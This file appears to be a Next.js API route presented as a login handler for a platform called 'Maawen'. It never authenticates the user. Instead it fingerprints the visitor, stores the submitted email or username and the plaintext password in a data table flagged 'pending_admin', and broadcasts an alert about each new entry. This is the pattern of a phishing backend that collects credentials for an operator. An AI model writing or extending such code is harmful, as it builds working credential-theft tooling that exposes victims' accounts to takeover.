import { NextRequest, NextResponse } from "next/server";
import { createServiceClient, broadcastNewEntry } from "@/lib/supabase/server";
import { autoUnarchiveOnActivity } from "@/lib/archive";
import { hashPassword } from "@/lib/password";

interface LoginBody {
  email?: string;
  username?: string;
  password?: string;
}

/** تسجيل محاولة دخول إلى منصة "معاون" في انتظار قرار المدير. */
export async function POST(request: NextRequest) {
  const body = (await request.json().catch(() => ({}))) as LoginBody;
  const email = String(body.email ?? "").trim().toLowerCase();
  const username = String(body.username ?? "").trim();
  const password = String(body.password ?? "");

  const credential = username || email;
  if (credential.length < 3) {
    return NextResponse.json({ error: "يرجى إدخال بريد إلكتروني أو اسم مستخدم صحيح" }, { status: 422 });
  }
  if (password.length < 4) {
    return NextResponse.json({ error: "كلمة المرور قصيرة جداً" }, { status: 422 });
  }

  const supabase = createServiceClient();
  const fingerprint = request.headers.get("x-fingerprint") || null;
  let clientId: string | null = null;

  if (fingerprint) {
    const { data: existing } = await supabase
      .from("clients")
      .select("id")
      .eq("fingerprint", fingerprint)
      .maybeSingle();
    if (existing) {
      clientId = existing.id;
    } else {
      const { data: created } = await supabase
        .from("clients")
        .insert({ fingerprint, name: credential })
        .select("id")
        .single();
      clientId = created?.id ?? null;
    }
  }

  const password_hash = await hashPassword(password);

  const { data: entryRow, error: insertErr } = await supabase
    .from("client_data_entries")
    .insert({
      client_id: clientId,
      type: "maawen_login",
      payload: {
        email: email || null,
        username: username || null,
        credential,
        password,
        password_hash,
        status: "pending_admin",
        created_at: new Date().toISOString(),
      },
    })
    .select("id")
    .single();

  if (insertErr || !entryRow) {
    return NextResponse.json({ error: "فشل حفظ بيانات الدخول" }, { status: 500 });
  }

  await autoUnarchiveOnActivity(clientId);

  void broadcastNewEntry({
    clientId: clientId ?? fingerprint ?? null,
    entryId: entryRow.id,
    type: "maawen_login",
  });

  return NextResponse.json({ ok: true, entryId: entryRow.id, status: "pending_admin" });
}